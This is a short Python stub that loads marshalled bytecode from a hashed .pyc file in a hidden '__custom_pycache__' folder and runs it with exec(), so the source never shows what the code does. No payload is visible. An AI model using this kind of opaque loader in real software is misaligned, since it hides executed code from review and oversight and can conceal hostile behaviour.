
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Responses_368f78fe457645c99f394589307c94e6.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
